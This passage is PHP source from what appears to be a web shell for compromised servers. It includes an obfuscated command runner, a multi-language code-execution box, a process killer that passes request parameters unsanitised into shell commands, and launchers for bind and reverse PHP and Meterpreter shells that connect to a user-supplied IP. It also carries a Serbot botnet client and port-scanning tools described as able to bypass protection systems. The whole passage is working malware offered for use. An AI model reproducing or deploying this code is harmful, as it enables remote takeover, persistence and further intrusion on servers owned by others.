			if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "shsh")
			{
				$response = shsh($decCommand." 2>&1");		
			}

			echo "<table class='flat-table flat-table-1'>";
			echo "<tr><td>".$decCommand."</td>";
			echo "<td><pre>";
			echo strip_tags($response);
			echo "</pre></td></tr>";
			echo "</table>";
		}
					
		$parts = explode(" ", $decCommand);
		if($parts[0] == "cd")
		{
			if(file_exists($parts[1]))
			{
				$_SESSION["directory"] = $parts[1];
				echo '<meta http-equiv="refresh" content="0" />';			
			}
			else
			{
				echo "<pre>Directory does not exist</pre>";
			}		
		}
	}
}
#<--

#Eval -->
echo "
<br><br><h3><A NAME='Eval' href=\"#Eval\">Eval</A></h3>

<form action=\"#Eval\" method=\"POST\">
	<textarea name=\"eval\" style=\"width: 400px; height: 100px;\"></textarea><br>
	<select name=\"language\">
		
		<option value='php'>PHP</option>";	
		if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($cgi == True) || ($shsh == True))
		{
			if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN')
			{
				if(soft_exists("python") != "")
				{
					echo "<option value='python'>Python</option>";
				}

				if(soft_exists("perl") != "")
				{
					echo "<option value='perl'>Perl</option>";
				}

				if(soft_exists("ruby") != "")
				{
					echo "<option value='ruby'>Ruby</option>";		
				}

				if(soft_exists("gcc") != "")
				{
					echo "<option value='c'>C</option>";
				}
							
				if(soft_exists("g++") != "")
				{
					echo "<option value='cpp'>C++</option>";
				}

				echo "<option value='bash'>Bash</option>";

			}
			else
			{
				echo "<option value='batch'>Batch</option>";

				$temporary = soft_exists("powershell");
				if ((!strpos($temporary,'INFO') !== false) && ($temporary != ""))
				{
					$powershell = str_replace("\n", "", $temporary);
					echo "<option value='powershell'>Powershell</option>";
				}

				$temporary = soft_exists("C:\\Python27:python");
				if ((!strpos($temporary,'INFO') !== false) && ($temporary != ""))
				{
					$python = str_replace("\n", "", $temporary);
					echo "<option value='python'>Python27</option>";
				}

				$temporary = soft_exists("C:\\Python34:python");
				if ((!strpos($temporary,'INFO') !== false) && ($temporary != ""))
				{
					$python = str_replace("\n", "", $temporary);
					echo "<option value='python'>Python34</option>";
				}

				$temporary = soft_exists("C:\\Perl32\\bin:perl");
				if ((!strpos($temporary,'INFO') !== false) && ($temporary != ""))
				{
					$perl = str_replace("\n", "", $temporary);
					echo "<option value='perl'>Perl32</option>";
				}

				$temporary = soft_exists("C:\\Perl64\\bin:perl");
				if ((!strpos($temporary,'INFO') !== false) && ($temporary != ""))
				{
					$perl = str_replace("\n", "", $temporary);
					echo "<option value='perl'>Perl64</option>";
				}

				$temporary = soft_exists("C:\\Ruby21-x32\\bin:ruby");
				if ((!strpos($temporary,'INFO') !== false) && ($temporary != ""))
				{
					$ruby = str_replace("\n", "", $temporary);
					echo "<option value='ruby'>Ruby32</option>";
				}

				$temporary = soft_exists("C:\\Ruby21-x64\\bin:ruby");
				if ((!strpos($temporary,'INFO') !== false) && ($temporary != ""))
				{
					$ruby = str_replace("\n", "", $temporary);
					echo "<option value='ruby'>Ruby64</option>";
				}
			}
		}
echo "
	</select>
	<input type=\"submit\" name=\"run\" value=\"run\" onclick=\"return xorencr2(this.form, this.form.language, this.form.eval);\"/>
</form>";

if(isset($_POST["run"]))
{
	$decEval = unxor_this($_POST["eval"]);

	if($_POST["language"] == "php")
	{
		runPHP($decEval);
	}
	
	if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True) || ($shsh == True))
	{

		if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
		{
			if($_POST["language"] == "python")
			{
				if ($python != "")
				{
					$filename = $writeread_dir .rand(1,1000) . ".py";
					file_put_contents($filename, $decEval);
					$command = "$python $filename";
					evalRel($command);
					unlink($filename);
				}
			}
	
			if ($_POST["language"] == "ruby")
			{
				if ($ruby != "")
				{
					$filename = $writeread_dir .rand(1,1000) . ".rb";
					file_put_contents($filename, $decEval);
					$command = "$ruby $filename";
					evalRel($command);
					unlink($filename);
				}
			}

			if ($_POST["language"] == "perl")
			{
				if ($perl != "")
				{
					$filename = $writeread_dir .rand(1,1000) . ".pl";
					file_put_contents($filename, $decEval);
					$command = "$perl $filename";
					evalRel($command);
					unlink($filename);
				}
			}

			if ($_POST["language"] == "powershell")
			{
				if ($powershell != "")
				{
					$filename = $writeread_dir .rand(1,1000)."ps1";
					file_put_contents($filename, $decEval);
					$command = "$powershell -executionpolicy remotesigned -File $filename";
					evalRel($command);
					unlink($filename);
				}
			}

			if($_POST["language"] == "batch")
			{
				$filename = $writeread_dir .rand(1,1000)."bat";
				file_put_contents($filename, $decEval);
				$command = $filename;
				evalRel($command);
				unlink($filename);
			}	
		}
		else
		{
			if($_POST["language"] == "python")
			{
				$filename = $writeread_dir .rand(1,1000).".py";
				file_put_contents($filename, $decEval);
				$command = "python $filename 2>&1";
				evalRel($command);
				unlink($filename);
			}

			if($_POST["language"] == "ruby")
			{
				$filename = $writeread_dir .rand(1,1000).".rb";
				file_put_contents($filename, $decEval);
				$command = "ruby $filename 2>&1";
				evalRel($command);
				unlink($filename);
			}

			if($_POST["language"] == "perl")
			{
				$filename = $writeread_dir .rand(1,1000).".pl";
				file_put_contents($filename, $decEval);
				$command = "perl $filename 2>&1";
				evalRel($command);
				unlink($filename);
			}


			if($_POST["language"] == "bash")
			{
				$filename = $writeread_dir .rand(1,1000).".sh";
				file_put_contents($filename, $decEval);
				$command = "$filename 2>&1";
				chm0dit($filename, 0755, "u=rx");
				evalRel($command);
				unlink($filename);
			}

			if($_POST["language"] == "c")
			{
				$filename = $writeread_dir .rand(1,1000);
				file_put_contents("$filename.c", $decEval);
				$command = "g++ $filename.c -o $filename";
				evalRel($command);
				unlink("$filename.c");
				$command = "$filename 2>&1";
				evalRel($command);
				unlink($filename);
			}

			if($_POST["language"] == "cpp")
			{
				$filename = $writeread_dir .rand(1,1000);
				file_put_contents("$filename.cpp", $decEval);
				$command = "g++ $filename.cpp -o $filename";
				evalRel($command);
				unlink("$filename.cpp");
				$command = "$filename 2>&1";
				evalRel($command);
				unlink($filename);
			}
		}
	}
}
#<--

#Process Manager-->
if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True) || ($shsh == True))
{
echo "
<br><br><h3><A NAME='Process Manager' href=\"#Process Manager\">Process Manager</A></h3>";

if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
{
	if(isset($_GET["kill"]))
	{
		if ($shell_exec == True)
		{
			$kill = shell_exec("taskkill /F /PID " . $_GET["kill"] . " 2>&1");
		}			
		else if($exec == True)
		{
			$kill = exec("taskkill /F /PID " . $_GET["kill"] . " 2>&1");
		}
		else if($popen == True)
		{
			$pid = popen("taskkill /F /PID " . $_GET["kill"] . " 2>&1","r");
			$kill = fread($pid, 4096);
			pclose($pid);
		}
		else if($proc_open == True)
		{
			$oprocess = proc_open(
				"taskkill /F /PID " . $_GET["kill"] . " 2>&1",
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes
			);
	
			if ($oprocess !== false)
			{
				$stdout = stream_get_contents($pipes[1]);
				$stderr = stream_get_contents($pipes[2]);
				fclose($pipes[1]);
				fclose($pipes[2]);
				proc_close($oprocess);

				if ($stderr == "")
				{
					$kill = $stdout;
				}
				else
				{
					$kill = "Fail";
				}
			}
			else
			{
				$kill = "Fail";
			}
		}
		else if ($cgi == True)
		{
			$tempcommand = base64encoding("taskkill /F /PID " . $_GET["kill"] . " 2>&1");
			$kill = url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");
		}
		else if($shsh == True)
		{
			$kill = shsh("taskkill /F /PID " . $_GET["kill"] . " 2>&1");
		}
		else
		{
			$kill = "Fail";
		}

		if(strpos($kill, "SUCCESS")!==false)
		{
			echo "<p class='success'>Success</p>";
		}			
		else
		{
			echo "<p class='danger'>Fail</p>";
		}
	}

	if ($shell_exec == True)
	{
		$process_list = shell_exec("tasklist");
		$processes = explode("\n", $process_list);
	}
	else if ($exec == True)
	{
		exec("tasklist", $processes);
	}
	else if($popen == True)
	{
		$pid = popen("tasklist","r");
		$process_list = fread($pid, 4096);
		pclose($pid);
		$processes = explode("\n", $process_list);
	}
	else if($proc_open == True)
	{
		$oprocess = proc_open(
			"tasklist",
			array(
				0 => array("pipe", "r"),
				1 => array("pipe", "w"),
				2 => array("pipe", "w"),
			),
			$pipes
		);
	
		if ($oprocess !== false)
		{
			$stdout = stream_get_contents($pipes[1]);
			$stderr = stream_get_contents($pipes[2]);
			fclose($pipes[1]);
			fclose($pipes[2]);
			proc_close($oprocess);

			if ($stderr == "")
			{
				$process_list = $stdout;
				$processes = explode("\n", $process_list);
			}
			else
			{
				$process_list = "Fail";
			}
		}
		else
		{
			$process_list = "Fail";
		}
	}
	else if ($cgi == True)
	{
		$tempcommand = base64encoding("tasklist");
		$process_list = url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");		
		$processes = explode("\n", $process_list);
	}
	else if ($shsh == True)
	{
		$process_list = shsh("tasklist");
		$processes = explode("\n", $process_list);
	}
	else
	{
		$process_list = "Fail";
	}

	echo "<table class='flat-table flat-table-3'>
		<tr>
			<th>Name</th>
			<th>Pid</th>
			<th>Kill</th>
		</tr>";
	
	$i = 0;
	foreach($processes as $process)
	{
		if($i > 2)
		{
			$parts = array_filter(explode(" ", $process));
			$parts = array_values($parts);
			if(isset($parts[0]) && strpos($parts[0], ".")!==false)
			{
				$name = $parts[0];
				$pid = $parts[1];
				echo "
				<tr>
					<td>$name</td>
					<td>$pid</td>
					<td><a href='?kill=$pid#Process Manager'>Kill</a></td>
				</tr>";
			}
		}
		$i++;
	}
	echo "</table>";
}
else
{
	if(isset($_GET["kill"]))
	{
		$pid = $_GET["kill"];
		
		if ($shell_exec == True)
		{
			$output = shell_exec("kill $pid 2>&1");
		}		
		else if($exec == True)
		{
			$output = exec("kill $pid 2>&1");
		}
		else if($popen == True)
		{
			$pid = popen("kill $pid 2>&1","r");
			$output = fread($pid, 4096);
			pclose($pid);
		}
		else if($proc_open == True)
		{
			$oprocess = proc_open(
				"kill $pid 2>&1",
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes
			);
	
			if ($oprocess !== false)
			{
				$stdout = stream_get_contents($pipes[1]);
				$stderr = stream_get_contents($pipes[2]);
				fclose($pipes[1]);
				fclose($pipes[2]);
				proc_close($oprocess);

				if ($stderr == "")
				{
					$output = $stdout;
				}
				else
				{
					$output = "Fail";
				}
			}
			else
			{
				$output = "Fail";
			}
		}
		else if ($cgi == True)
		{
			$tempcommand = base64encoding("kill $pid 2>&1");
			$output = url_get_contents($_SESSION["onlinecgi"]."?command=$base64encoding");		
		}
		else if ($shsh == True)
		{
			$output = shsh("kill $pid 2>&1");
		}
		else
		{
			$output = "Fail";
		}

		if(empty($output))
		{
			echo "<p class='success'>Success</p>";
		}		
		else
		{
			echo "<p class='danger'>Fail</p>";
		}
	}

	if ($shell_exec == True)
	{
		$process_list = shell_exec("ps aux");
		$processes = explode("\n", $process_list);	
	}
	else if ($exec == True)
	{
		exec("ps aux", $processes);
	}
	else if($popen == True)
	{
		$pid = popen("ps aux","r");
		$process_list = fread($pid, 4096);
		pclose($pid);
		$processes = explode("\n", $process_list);
	}
	else if($proc_open == True)
	{
		$oprocess = proc_open(
			"ps aux",
			array(
				0 => array("pipe", "r"),
				1 => array("pipe", "w"),
				2 => array("pipe", "w"),
			),
			$pipes
		);
	
		if ($oprocess !== false)
		{
			$stdout = stream_get_contents($pipes[1]);
			$stderr = stream_get_contents($pipes[2]);
			fclose($pipes[1]);
			fclose($pipes[2]);
			proc_close($oprocess);

			if ($stderr == "")
			{
				$process_list = $stdout;
				$processes = explode("\n", $process_list);
			}
			else
			{
				$process_list = "Fail";
			}
		}
		else
		{
			$process_list = "Fail";
		}
	}
	else if ($cgi == True)
	{
		$tempcommand = base64encoding("ps aux");
		$process_list = url_get_contents($_SESSION["onlinecgi"]."?command=$tempcommand");		
		$processes = explode("\n", $process_list);
	}
	else if($shsh == True)
	{
		$process_list = shsh("ps aux");
		$processes = explode("\n", $process_list);	
	}
	else
	{
		$process_list = "Fail";
	}

	echo "<table class='flat-table flat-table-3'>
		<tr>
			<th>User</th>
			<th>PID</th>
			<th>Process</th>
			<th>Kill</th>
		</tr>";

	$i = 0;
	foreach($processes as $process)
	{
		if($i > 0 && isset($process[0]))
		{
			$parts = array_filter(explode(" ", $process));
			$parts = array_values($parts);	
			$user = $parts[0];
			$pid = $parts[1];
			$command = array_pop($parts);
			
			echo "
			<tr>
				<td>$user</td>
				<td>$pid</td>
				<td>$command</td>
				<td><a href='?kill=$pid#Process Manager'>Kill</a></td>
			</tr>";
		}
		$i++;
	}
	echo "</table>";
}
}
#<--

#Shells and Tools: Execution-->
if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "bps"))
{
	global $phpbindshell, $nohup;

	if(isset($_POST['bind_port']))
	{
		if ($_POST['bind_port'] != "")
		{
			$port = $_POST['bind_port'];
		}
		else
		{
			$port = 31337;
		}
	}	
	else
	{
		$port = 31337;
	}

	$phpbindshell = unsh3ll_this($phpbindshell);
	$phpbindshell = str_replace("\$port=4444;", "\$port=$port;", $phpbindshell);
	
	$filename = $writeread_dir .rand(1,1000) . ".php";

	file_put_contents($filename, $phpbindshell);
	if (($nohup == True) && (isset($_POST["nohup"])))
	{
		$command = "nohup php '$filename' > /dev/null 2>&1 &";
		if(evalRel($command)=="False")
		{
			runPHP($phpbindshell);
		}
	}
	else
	{
		$command = "php '$filename' 2>&1";
		if(evalRel($command)=="False")
		{
			runPHP($phpbindshell);
		}
		unlink($filename);
	}
}

if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "rps"))
{
	global $phpreverseshell, $nohup;

	if(isset($_POST['port']))
	{
		if ($_POST['port'] != "")
		{
			$port = $_POST['port'];
		}
		else
		{
			$port = 31337;
		}
	}	
	else
	{
		$port = 31337;
	}

	$phpreverseshell = unsh3ll_this($phpreverseshell);
	$phpreverseshell = str_replace("\$port=4444;", "\$port=$port;", $phpreverseshell);
	$phpreverseshell = str_replace("\$ipaddr='192.168.1.104';", "\$ipaddr='".$_POST['ip']."';", $phpreverseshell);

	$filename = $writeread_dir .rand(1,1000) . ".php";

	file_put_contents($filename, $phpreverseshell);
	if (($nohup == True) && (isset($_POST["nohup"])))
	{
		$command = "nohup php '$filename' > /dev/null 2>&1 &";
		if(evalRel($command)=="False")
		{
			runPHP($phpreverseshell);
		}
	}
	else
	{
		$command = "php '$filename' 2>&1";
		if(evalRel($command)=="False")
		{
			runPHP($phpreverseshell);
		}
		unlink($filename);
	}
}

if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "bmps"))
{
	global $meterpreterbindshell, $nohup;

	if(isset($_POST['port']))
	{
		if ($_POST['port'] != "")
		{
			$port = $_POST['port'];
		}
		else
		{
			$port = 31337;
		}
	}	
	else
	{
		$port = 31337;
	}

	$meterpreterbindshell = unsh3ll_this($meterpreterbindshell);
	$meterpreterbindshell = str_replace("\$port = 4444;", "\$port = $port;", $meterpreterbindshell);
	$filename = $writeread_dir .rand(1,1000) . ".php";

	file_put_contents($filename, $meterpreterbindshell);
	if (($nohup == True) && (isset($_POST["nohup"])))
	{
		$command = "nohup php '$filename' > /dev/null 2>&1 &";
		if(evalRel($command)=="False")
		{
			runPHP($meterpreterbindshell);
		}
	}
	else
	{
		$command = "php '$filename' 2>&1";
		if(evalRel($command)=="False")
		{
			runPHP($meterpreterbindshell);
		}
		unlink($filename);
	}
}

if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "rmps"))
{
	global $meterpreterreverseshell, $nohup;

	if(isset($_POST['port']))
	{
		if ($_POST['port'] != "")
		{
			$port = $_POST['port'];
		}
		else
		{
			$port = 31337;
		}
	}	
	else
	{
		$port = 31337;
	}

	$meterpreterreverseshell = unsh3ll_this($meterpreterreverseshell);
	$meterpreterreverseshell = str_replace("\$port = 4444;", "\$port = $port;", $meterpreterreverseshell);
	$meterpreterreverseshell = str_replace("\$ip = '192.168.1.104';", "\$ip = '".$_POST['ip']."';", $meterpreterreverseshell);
	$filename = $writeread_dir .rand(1,1000) . ".php";

	file_put_contents($filename, $meterpreterreverseshell);
	if (($nohup == True) && (isset($_POST["nohup"])))
	{
		$command = "nohup php '$filename' > /dev/null 2>&1 &";
		if(evalRel($command)=="False")
		{
			runPHP($meterpreterreverseshell);
		}
	}
	else
	{
		$command = "php '$filename' 2>&1";
		if(evalRel($command)=="False")
		{
			runPHP($meterpreterreverseshell);
		}
		unlink($filename);
	}
}

if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "sc"))
{
	global $serbotclient, $nohup;

	if(isset($_POST['port']))
	{
		if ($_POST['port'] != "")
		{
			$port = $_POST['port'];
		}
		else
		{
			$port = 31337;
		}
	}	
	else
	{
		$port = 31337;
	}

	$serbotclient = unsh3ll_this($serbotclient);
	$filename = $writeread_dir .rand(1,1000) . ".py";

	file_put_contents($filename, $serbotclient);
	if (($nohup == True) && (isset($_POST["nohup"])))
	{
		$command = "nohup python '$filename' ".$_POST['ip']." $port> /dev/null 2>&1 &";
		evalRel($command);
	}
	else
	{
		$command = "python '$filename' 2>&1";
		evalRel($command);
		unlink($filename);
	}
}

if(isset($_GET["tool"]) && ($_GET["tool"] == "bpscan"))
{
	global $bpscan, $nohup;

	$bpscan = unsh3ll_this($bpscan);
	$bpscan = str_replace("'remoteAddress': '192.168.1.4',", "'remoteAddress': '".$_SERVER['SERVER_ADDR']."',", $bpscan);

	$filename = "bpscan.py";
	if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$filename = getcwd()."\\".$filename;
	}
	else
	{
		$filename = getcwd()."/".$filename;
	}

	file_put_contents($filename, $bpscan);
	if (($nohup == True) && (isset($_POST["nohup"])))
	{
		$command = "nohup python '$filename' > /dev/null 2>&1 &";
		evalRel($command);
	}
	else
	{
		$command = "python '$filename' 2>&1";
		evalRel($command);
		unlink($filename);
	}
}

if(isset($_GET["tool"]) && ($_GET["tool"] == "bpscanp"))
{
	global $bpscanp, $nohup;

	$bpscanp = unsh3ll_this($bpscanp);
	$bpscanp = str_replace("\"remoteAddress\" => \"192.168.1.4\"", "\"remoteAddress\" => \"".$_SERVER['SERVER_ADDR']."\"", $bpscanp);
	$bpscanp = str_replace("remoteAddress=192.168.1.4", "remoteAddress=".$_SERVER['SERVER_ADDR'], $bpscanp);

	$filename = "bpscan.php";
	if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$filename = getcwd()."\\".$filename;
	}
	else
	{
		$filename = getcwd()."/".$filename;
	}

	file_put_contents($filename, $bpscanp);
	if (($nohup == True) && (isset($_POST["nohup"])))
	{
		$command = "nohup php '$filename' > /dev/null 2>&1 &";
		if(evalRel($command)=="False")
		{
			runPHP($bpscanp);
		}
	}
	else
	{
		$command = "php '$filename' 2>&1";
		if(evalRel($command)=="False")
		{
			runPHP($bpscanp);
		}
		unlink($filename);
	}
}
#<--

#Built In Shells: Forms-->
?>

<br><br><h3><A NAME='Shells' href="#Shells">Shells</A></h3>

<table class='flat-table flat-table-3'>
		<form action='?deSh3ll=bmps#Shells' method='post' >
			<tr>
				<td>Type</td>
				<td>Bind Meterpreter PHP Shell</td>
			</tr>
			<tr>
				<td>Port</td>
				<td><input style='width:300px' name='port' type='text'/></td>
			</tr>
			<tr>
				<td></td>
				<td><input type='submit' value='Start' name='Start'/> <input type="checkbox" name="nohup" value="nohup">Nohup</td>
			</tr>
		</form>
</table>

<table class='flat-table flat-table-3'>
		<form action='?deSh3ll=rmps#Shells' method='post' >
			<tr>
				<td>Type</td>
				<td>Reverse Meterpreter PHP Shell</td>
			</tr>
			<tr>
				<td>IP</td>
				<td><input style='width:300px' name='ip' type='text'/></td>
			</tr>
			<tr>
				<td>Port</td>
				<td><input style='width:300px' name='port' type='text'/></td>
			</tr>
			<tr>
				<td></td>
				<td><input type='submit' value='Start' name='Start'/> <input type="checkbox" name="nohup" value="nohup">Nohup</td>
			</tr>
		</form>
</table>

<table class='flat-table flat-table-3'>
		<form action='?deSh3ll=bps#Shells' method='post' >
			<tr>
				<td>Type</td>
				<td>Bind PHP Shell</td>
			</tr>
			<tr>
				<td>Port</td>
				<td><input style='width:300px' name='bind_port' type='text'/></td>
			</tr>
			<tr>
				<td></td>
				<td><input type='submit' value='Start' name='Start'/> <input type="checkbox" name="nohup" value="nohup">Nohup</td>
			</tr>
		</form>
</table>

<table class='flat-table flat-table-3'>
		<form action='?deSh3ll=rps#Shells' method='post' >
			<tr>
				<td>Type</td>
				<td>Reverse PHP Shell</td>
			</tr>
			<tr>
				<td>IP</td>
				<td><input style='width:300px' name='ip' type='text'/></td>
			</tr>
			<tr>
				<td>Port</td>
				<td><input style='width:300px' name='port' type='text'/></td>
			</tr>
			<tr>
				<td></td>
				<td><input type='submit' value='Start' name='Start'/> <input type="checkbox" name="nohup" value="nohup">Nohup</td>
			</tr>
		</form>
</table>

<?php

if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True) || ($shsh == True))
{
echo "
<table class='flat-table flat-table-3'>
		<form action='?deSh3ll=sc#Shells' method='post' >
			<tr>
				<td>Type</td>
				<td>Serbot - Client</td>
			</tr>
			<tr>
				<td>IP</td>
				<td><input style='width:300px' name='ip' type='text'/></td>
			</tr>
			<tr>
				<td>Port</td>
				<td><input style='width:300px' name='port' type='text'/></td>
			</tr>
			<tr>
				<td></td>
				<td><input type='submit' value='Start' name='Start'/> <input type='checkbox' name='nohup' value='nohup'>Nohup</td>
			</tr>
		</form>
</table>";
}

echo "

<br><h3><A NAME='Tools' href=\"#Tools\">Tools</A></h3>

<table class='flat-table flat-table-1'>
	<tr>
		<td>Name</td>
		<td>Language</td>
		<td>Author</td>
		<td>Goal</td>
		<td>Description</td>
		<td>Action</td>
	</tr>";
if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True) || ($shsh == True))
{
	echo "
	<form action='?tool=bpscan#Tools' method='post' >
		<tr>
			<td>bpscan</td>
			<td>Python</td>
			<td>dotcppfile</td>
			<td>Find useable/unblocked ports.</td>
			<td>bpscan uses basic python socket binding with the service offered by yougetsignal.com to find useable/unblocked ports. The outputs are 'bpscan - errors.txt' and `bpscan - ports.txt' which will hold the found useable/unblocked ports. It uses 25 threads at a time but gets the job done so bare with it.</td>
			<td><input type='submit' value='Start' name='Start'/> <input type='checkbox' name='nohup' value='nohup'>Nohup</td>
		</tr>
	</form>";
}

echo "
	<form action='?tool=bpscanp#Tools' method='post' >
		<tr>
			<td>bpscan - php</td>
			<td>PHP</td>
			<td>dotcppfile & Aces</td>
			<td>Find useable/unblocked ports.</td>
			<td>Same as `bpscan` but it's coded in PHP and uses 1 thread. It's also capable of bypassing Protection Systems.</td>
			<td><input type='submit' value='Start' name='Start'/> <input type='checkbox' name='nohup' value='nohup'>Nohup</td>
		</tr>
	</form>
</table>";
#<--

?>

</center>
</body>
</html>
